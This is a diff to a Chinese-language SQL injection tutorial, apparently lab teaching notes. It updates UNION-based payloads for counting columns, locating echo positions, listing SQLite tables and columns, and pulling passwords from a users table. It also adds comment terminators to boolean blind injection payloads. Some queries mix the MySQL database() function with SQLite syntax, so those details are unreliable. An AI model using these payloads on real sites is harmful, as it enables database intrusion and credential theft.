@@ -31,26 +31,27 @@
   本例闭合方式：'（单引号）
 
 第四步：判断列数
-  ' ORDER BY 3 --  → 正常返回
-  ' ORDER BY 4 --  → 报错 → 列数为 3（若4报错3正常）
+  ' ORDER BY 4 --  → 正常返回
+  ' ORDER BY 5 --  → 报错 → 列数为 4（若5报错4正常）
   或使用 UNION SELECT NULL 逐次探测：
   ' UNION SELECT NULL --
   ' UNION SELECT NULL,NULL --
-  ' UNION SELECT NULL,NULL,NULL --   → 正常（3列）
-  ' UNION SELECT NULL,NULL,NULL,NULL -- → 报错（超列数）
+  ' UNION SELECT NULL,NULL,NULL --
+  ' UNION SELECT NULL,NULL,NULL,NULL --   → 正常（4列）
+  ' UNION SELECT NULL,NULL,NULL,NULL,NULL -- → 报错（超列数）
 
 第五步：查询回显位置
-  ' UNION SELECT 1,2,3 --
-  页面显示的数字即为回显位置。本例回显位置为 2,3。
+  ' UNION SELECT 1,2,3,4 --
+  页面显示的数字即为回显位置。本例回显位置为 2,3,4。
 
 第六步：获取数据库名
-  ' UNION SELECT 1,2,database() --
+  ' UNION SELECT 1,2,database(),4 --
 
 第七步：获取表名（SQLite语法）
-  ' UNION SELECT 1,2,group_concat(name) FROM sqlite_master WHERE type='table' --
+  ' UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master WHERE type='table' --
 
 第八步：获取列名
-  ' UNION SELECT 1,2,group_concat(name) FROM pragma_table_info('users') --
+  ' UNION SELECT 1,2,group_concat(name),4 FROM pragma_table_info('users') --
 
 第九步：获取数据
   ' UNION SELECT 1,2,password,4 FROM users --
@@ -109,18 +110,19 @@ SQL:     SELECT ... WHERE username LIKE '%' OR '1'='1%'
 ### 类型③：AND布尔盲注
 
 **原理：** 利用 `AND` 构造条件判断，根据页面是否返回数据推断数据库信息。
+注意：必须使用 `--` 注释符闭合尾部 SQL，否则尾部 `%'` 会导致条件失效。
 
 **攻击场景：**
 ```
-条件为真:  admin' AND '1'='1   → 返回数据
-条件为假:  admin' AND '1'='2   → 无数据
+条件为真:  admin' AND '1'='1' --   → 返回数据
+条件为假:  admin' AND '1'='2' --   → 无数据
 ```
 
 **猜解过程（以数据库名为例）：**
 ```
-搜索:  admin' AND length(database())=4  → 有数据 → 库名长度=4
-搜索:  admin' AND substr(database(),1,1)='m' → 有数据 → 首字母'm'
-搜索:  admin' AND substr(database(),2,1)='a' → 有数据 → 第二字母'a'
+搜索:  admin' AND length(database())=4 --  → 有数据 → 库名长度=4
+搜索:  admin' AND substr(database(),1,1)='m' --  → 有数据 → 首字母'm'
+搜索:  admin' AND substr(database(),2,1)='a' --  → 有数据 → 第二字母'a'
 ...逐个猜解直至完整 → "main"
 ```
 
